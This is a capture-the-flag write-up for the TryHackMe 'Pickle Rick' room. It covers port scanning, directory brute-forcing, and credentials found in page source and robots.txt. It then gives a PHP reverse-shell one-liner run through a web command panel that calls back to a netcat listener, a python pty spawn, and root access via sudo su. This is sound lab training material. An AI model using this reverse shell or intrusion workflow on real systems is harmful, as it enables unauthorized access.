# CTF: [Pickle Rick](https://tryhackme.com/room/picklerick)
## Enumeration
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c9:26:a8:ca:c4:a1:1f:a6:a8:cf:ad:b5:0a:78:86:a1 (RSA)
|   256 7e:77:da:49:08:a3:a9:71:9a:c8:7d:0f:0d:c7:27:a6 (ECDSA)
|_  256 47:5a:74:c8:95:b5:e3:fc:99:83:26:11:ca:12:f5:43 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```
Navigate to the address on a browser. Inspect the source code. You should find a comment that gives us a hint.
```html
 <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```
Now we have a username. I tried brute forcing the SSH server with Hydra, but to no avail. We could run a gobuster to find hidden directories.
## Hidden directories
```
└─# gobuster dir -u 10.10.66.136 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 -x txt,html,php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.66.136
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
2021/08/27 00:12:17 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1062]
/login.php            (Status: 200) [Size: 882] 
/assets               (Status: 301) [Size: 313] [--> http://10.10.66.136/assets/]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]                   
/robots.txt           (Status: 200) [Size: 17] 
```
## /robots.txt
```html
Wubbalubbadubdub
```
This file contains the password for `R1ckRul3s`.
## /portal.php
This page contains a login portal. Enter the credentials (R1ckRul3s:Wubbalubbadubdub)
![pickrickportal](https://user-images.githubusercontent.com/59718043/131052626-b276adcc-e404-446d-99bc-5cc9363c39d3.png)
## Reverse shell
This admin page contains a command panel/webshell. We could use this to get a reverse shell.
<br/><br/>
Start a Netcat listener (on your machine).
```
nc -nvlp 4444
```
Execute this command on the webshell.
```
php -r '$sock=fsockopen("10.8.219.166",4444);exec("/bin/sh -i <&4 >&4 2>&4");'
```
Check your netcat listener, by now it should have opened a reverse connection to the server.
```
Listening on 0.0.0.0 4444
Connection received on 10.10.148.23 35928
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```
The first ingredient is under `/var/www/html/Sup3rS3cretPickl3Ingred.txt`.
<br/><br/>
The second ingredient is under `/home/rick/'second ingredients'`.
## Spawn a TTY
```
$ which python3
/usr/bin/python3
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@ip-10-10-148-23:/var/www/html$ 
```
## Privilege escalation
Run `sudo -l`. This user should be able to log in as root. Execute `sudo su` to log in as root.
```
www-data@ip-10-10-148-23:/var/www/html$ sudo su
sudo su
root@ip-10-10-148-23:/var/www/html# 
```
The third ingredient is under `/root/3rd.txt`.
